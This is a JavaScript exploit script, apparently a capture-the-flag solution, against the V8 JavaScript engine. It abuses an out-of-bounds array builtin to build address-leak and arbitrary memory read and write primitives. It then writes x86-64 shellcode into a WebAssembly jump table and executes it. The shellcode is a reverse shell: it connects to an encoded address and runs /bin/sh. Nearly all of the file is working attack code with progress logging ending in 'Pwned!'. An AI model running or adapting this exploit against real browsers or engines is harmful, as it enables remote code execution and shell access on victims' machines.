/* ======================== START UTILITY =========================== */
// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have exactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

function UnTag(addr) {
    if (parseInt(addr.toString()) & 1) {
        addr = Sub(addr, 1);
    }
    return addr;
}


/* ========== BEGIN Error Triggering =========== */
var oob_arr = [0.3, 0.4];
var victim_buf = new ArrayBuffer(0x4141);
var victim_obj = {marker: 0x41414141, obj: {}};

var new_size = (new Int64('7fffffff00000000')).asDouble();
oob_arr.wtf(5, new_size);

/* ========== BEGIN Object Finding =========== */
let victim_buf_idx_ptr = null;
for (let i = 0; i < oob_arr.length; i++) {
    let val = Int64.fromDouble(oob_arr[i]).toString();
    if (val === "0x0000000000004141") {
        victim_buf_idx_ptr = i + 1;
        console.log("[+] Found victim buffer's pointer at " + victim_buf_idx_ptr);
        break;
    }
}

let victim_obj_idx_obj = null;
for (let i = 0; i < 100; i++) {
    let val = Int64.fromDouble(oob_arr[i]).toString();
    if (val === "0x4141414100000000") {
        victim_obj_idx_obj = i + 1
        console.log("[+] found victim obj's obj property at " + victim_obj_idx_obj);
        break;
    }
}

/* ========== BEGIN Primitive Functions =========== */
let old = oob_arr[victim_buf_idx_ptr];
// to avoid error in gc, we save the old object first
function addrof(obj) {
    victim_obj.obj = obj;
    var addr = Int64.fromDouble(oob_arr[victim_obj_idx_obj]);
    // Untag the pointer
    return UnTag(addr)
}

// Now we can define the function read and write
function readme(addr, size) {
    oob_arr[victim_buf_idx_ptr] = addr.asDouble();
    let a = new Uint8Array(victim_buf, 0, size);
    var res = Array.from(a);
    // restore the old object when we are done
    oob_arr[victim_buf_idx_ptr] = old;
    return UnTag(res);
}

function write(addr, bytes) {
    oob_arr[victim_buf_idx_ptr] = addr.asDouble();
    let a = new Uint8Array(victim_buf);
    a.set(bytes);
    // restore the old object when we are done
    oob_arr[victim_buf_idx_ptr] = old;
}

function read32(addr) {
    return Struct.unpack(Struct.int32, readme(addr, 4));
}

function read64(addr) {
    return new Int64(readme(addr, 8));
}

function write64(addr, int64) {
    write(addr, int64.bytes); 
}

/* ========== BEGIN Exploiting =========== */
// We can't overwrite code, because of compilation flag
// write_protect_code_memory, which defaults to true
// however wasm_write_protect_code_memory is false by default

// WASM Functions
function utf8ToString(h, p) {
  let s = "";
  for (i = p; h[i]; i++) {
    s += String.fromCharCode(h[i]);
  }
  return s;
}

function test() {
  var wasmImports = {
    env: {
      puts: function puts (index) {
        print(utf8ToString(h, index));
      }
    }
  };
  var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
    96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
    116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
    131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
    109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
    128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
    65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
  let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
  let h = new Uint8Array(m.exports.memory.buffer);
  return m.exports.hello;
}

global_test = test();
let f_addr = addrof(global_test);
console.log("[+] found JSFunction at " + f_addr.toString());

// TODO: This is not portable
let WasmOffsets = {
    shared_function_info : 3 * 8,
    wasm_exported_function_data : 1 * 8,
    wasm_instance : 2 * 8,
    jump_table_start : 29 * 8
}

let shellcode = [0x6a, 0x29, 0x58, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x99, 0x0f, 0x05, 0x52, 0xba, 0x01, 0x01, 0x01, 0x01, 0x81, 0xf2, 0x03, 0x01, 0x0f, 0x98, 0x52, 0x6a, 0x10, 0x5a, 0x48, 0x89, 0xc5, 0x48, 0x89, 0xc7, 0x6a, 0x31, 0x58, 0x48, 0x89, 0xe6, 0x0f, 0x05, 0x6a, 0x32, 0x58, 0x48, 0x89, 0xef, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x6a, 0x2b, 0x58, 0x48, 0x89, 0xef, 0x31, 0xf6, 0x99, 0x0f, 0x05, 0x48, 0x89, 0xc5, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x78, 0x0b, 0x56, 0x6a, 0x21, 0x58, 0x48, 0x89, 0xef, 0x0f, 0x05, 0xeb, 0xef, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05]


let sf_info_addr = UnTag(read64(Add(f_addr, WasmOffsets['shared_function_info'])));
console.log("[+] found SharedFunctionInfo at " + sf_info_addr.toString());
let wasm_ef_data_addr = UnTag(read64(Add(sf_info_addr, WasmOffsets['wasm_exported_function_data'])));
console.log("[+] found WasmExportedFunctionData at " + wasm_ef_data_addr.toString());
let wasm_instance_addr = UnTag(read64(Add(wasm_ef_data_addr, WasmOffsets['wasm_instance'])));
console.log("[+] found WasmInstance at " + wasm_instance_addr.toString());
let wasm_jump_table_addr = UnTag(read64(Add(wasm_instance_addr, WasmOffsets['jump_table_start'])));
console.log("[+] found JumpTableStart at " + wasm_jump_table_addr.toString());
console.log("[+] writting shellcode ...");
write(wasm_jump_table_addr, shellcode);
console.log("[+] Pwned!");
global_test();
/*
while (1) {
}
*/
